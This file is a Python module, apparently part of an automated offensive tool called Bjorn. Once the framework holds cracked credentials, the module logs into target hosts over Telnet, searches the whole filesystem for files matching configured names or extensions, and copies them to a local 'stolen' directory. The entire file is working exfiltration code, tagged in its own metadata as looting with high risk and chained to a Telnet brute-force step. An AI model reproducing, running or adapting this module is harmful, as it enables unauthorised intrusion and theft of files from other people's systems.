"""steal_files_telnet.py - Loot files over Telnet using cracked credentials."""

import os
import telnetlib
import logging
import time
from threading import Timer
from typing import List, Tuple, Dict, Optional

from shared import SharedData
from logger import Logger

logger = Logger(name="steal_files_telnet.py", level=logging.DEBUG)

b_class  = "StealFilesTelnet"
b_module = "steal_files_telnet"
b_status = "steal_files_telnet"
b_parent = "TelnetBruteforce"
b_port   = 23
b_enabled = 1
b_action = "normal"
b_service = '["telnet"]'
b_trigger = 'on_any:["on_cred_found:telnet","on_service:telnet"]'
b_requires = '{"all":[{"has_cred":"telnet"},{"has_port":23}]}'
b_priority = 60
b_cooldown = 3600
b_timeout = 600
b_stealth_level = 5
b_risk_level = "high"
b_max_retries = 1
b_tags = ["exfil", "telnet", "loot", "files"]
b_category = "exfiltration"
b_name = "Steal Files Telnet"
b_description = "Loot files over Telnet using cracked credentials."
b_author = "Bjorn Team"
b_version = "2.0.0"
b_icon = "StealFilesTelnet.png"


class StealFilesTelnet:
    def __init__(self, shared_data: SharedData):
        self.shared_data = shared_data
        self.telnet_connected = False
        self.stop_execution = False
        self._ip_to_identity: Dict[str, Tuple[Optional[str], Optional[str]]] = {}
        self._refresh_ip_identity_cache()
        logger.info("StealFilesTelnet initialized")

    # -------- Identity cache --------
    def _refresh_ip_identity_cache(self) -> None:
        self._ip_to_identity.clear()
        try:
            rows = self.shared_data.db.get_all_hosts()
        except Exception as e:
            logger.error(f"DB get_all_hosts failed: {e}")
            rows = []
        for r in rows:
            mac = r.get("mac_address") or ""
            if not mac:
                continue
            hostnames_txt = r.get("hostnames") or ""
            current_hn = hostnames_txt.split(';', 1)[0] if hostnames_txt else ""
            ips_txt = r.get("ips") or ""
            if not ips_txt:
                continue
            for ip in [p.strip() for p in ips_txt.split(';') if p.strip()]:
                self._ip_to_identity[ip] = (mac, current_hn)

    def mac_for_ip(self, ip: str) -> Optional[str]:
        if ip not in self._ip_to_identity:
            self._refresh_ip_identity_cache()
        return self._ip_to_identity.get(ip, (None, None))[0]

    def hostname_for_ip(self, ip: str) -> Optional[str]:
        if ip not in self._ip_to_identity:
            self._refresh_ip_identity_cache()
        return self._ip_to_identity.get(ip, (None, None))[1]

    # -------- Creds --------
    def _get_creds_for_target(self, ip: str, port: int) -> List[Tuple[str, str]]:
        mac = self.mac_for_ip(ip)
        params = {"ip": ip, "port": port, "mac": mac or ""}

        by_ip = self.shared_data.db.query(
            """
            SELECT "user","password"
              FROM creds
             WHERE service='telnet'
               AND COALESCE(ip,'')=:ip
               AND (port IS NULL OR port=:port)
            """, params)

        by_mac = []
        if mac:
            by_mac = self.shared_data.db.query(
                """
                SELECT "user","password"
                  FROM creds
                 WHERE service='telnet'
                   AND COALESCE(mac_address,'')=:mac
                   AND (port IS NULL OR port=:port)
                """, params)

        seen, out = set(), []
        for row in (by_ip + by_mac):
            u = str(row.get("user") or "").strip()
            p = str(row.get("password") or "").strip()
            if not u or (u, p) in seen:
                continue
            seen.add((u, p))
            out.append((u, p))
        return out

    # -------- Telnet helpers --------
    def connect_telnet(self, ip: str, username: str, password: str) -> Optional[telnetlib.Telnet]:
        try:
            tn = telnetlib.Telnet(ip, b_port, timeout=10)
            tn.read_until(b"login: ", timeout=5)
            tn.write(username.encode('ascii') + b"\n")
            if password:
                tn.read_until(b"Password: ", timeout=5)
                tn.write(password.encode('ascii') + b"\n")
            # Naive prompt detection (matches original behavior)
            time.sleep(2)
            self.telnet_connected = True
            logger.info(f"Connected to {ip} via Telnet as {username}")
            return tn
        except Exception as e:
            logger.error(f"Telnet connect error {ip} {username}: {e}")
            return None

    def find_files(self, tn: telnetlib.Telnet, dir_path: str) -> List[str]:
        try:
            if self.shared_data.orchestrator_should_exit or self.stop_execution:
                logger.info("File search interrupted.")
                return []
            tn.write(f'find {dir_path} -type f\n'.encode('ascii'))
            out = tn.read_until(b"$", timeout=10).decode('ascii', errors='ignore')
            files = out.splitlines()
            matches = []
            for f in files:
                if self.shared_data.orchestrator_should_exit or self.stop_execution:
                    logger.info("File search interrupted.")
                    return []
                fname = os.path.basename(f.strip())
                if (self.shared_data.steal_file_extensions and any(fname.endswith(ext) for ext in self.shared_data.steal_file_extensions)) or \
                   (self.shared_data.steal_file_names and any(sn in fname for sn in self.shared_data.steal_file_names)):
                    matches.append(f.strip())
            logger.info(f"Found {len(matches)} matching files under {dir_path}")
            return matches
        except Exception as e:
            logger.error(f"Telnet find error: {e}")
            return []

    def steal_file(self, tn: telnetlib.Telnet, remote_file: str, base_dir: str) -> None:
        try:
            if self.shared_data.orchestrator_should_exit or self.stop_execution:
                logger.info("Steal interrupted.")
                return
            local_file_path = os.path.join(base_dir, os.path.relpath(remote_file, '/'))
            os.makedirs(os.path.dirname(local_file_path), exist_ok=True)
            with open(local_file_path, 'wb') as f:
                tn.write(f'cat {remote_file}\n'.encode('ascii'))
                f.write(tn.read_until(b"$", timeout=10))
            logger.success(f"Downloaded {remote_file} -> {local_file_path}")
        except Exception as e:
            logger.error(f"Telnet download error {remote_file}: {e}")

    # -------- Orchestrator entry --------
    def execute(self, ip: str, port: str, row: Dict, status_key: str) -> str:
        try:
            self.shared_data.bjorn_orch_status = "StealFilesTelnet"
            # EPD live status
            self.shared_data.comment_params = {"ip": ip, "port": str(port), "files": "0"}
            try:
                port_i = int(port)
            except Exception:
                port_i = b_port

            creds = self._get_creds_for_target(ip, port_i)
            logger.info(f"Found {len(creds)} Telnet credentials in DB for {ip}")
            if not creds:
                logger.error(f"No Telnet credentials for {ip}. Skipping.")
                return 'failed'

            def _timeout():
                if not self.telnet_connected:
                    logger.error(f"No Telnet connection within 4 minutes for {ip}. Failing.")
                    self.stop_execution = True

            timer = Timer(240, _timeout)
            timer.start()

            mac = (row or {}).get("MAC Address") or self.mac_for_ip(ip) or "UNKNOWN"
            base_dir = os.path.join(self.shared_data.data_stolen_dir, f"telnet/{mac}_{ip}")

            success = False
            for username, password in creds:
                if self.stop_execution or self.shared_data.orchestrator_should_exit:
                    logger.info("Execution interrupted.")
                    break
                try:
                    tn = self.connect_telnet(ip, username, password)
                    if not tn:
                        continue
                    files = self.find_files(tn, '/')
                    if files:
                        for remote in files:
                            if self.stop_execution or self.shared_data.orchestrator_should_exit:
                                logger.info("Execution interrupted.")
                                break
                            self.steal_file(tn, remote, base_dir)
                        logger.success(f"Stole {len(files)} files from {ip} as {username}")
                        success = True
                    try:
                        tn.close()
                    except Exception:
                        pass
                    if success:
                        timer.cancel()
                        return 'success'
                except Exception as e:
                    logger.error(f"Telnet loot error {ip} {username}: {e}")

            timer.cancel()
            return 'success' if success else 'failed'

        except Exception as e:
            logger.error(f"Unexpected error during execution for {ip}:{port}: {e}")
            return 'failed'
        finally:
            self.shared_data.bjorn_progress = ""
            self.shared_data.comment_params = {}
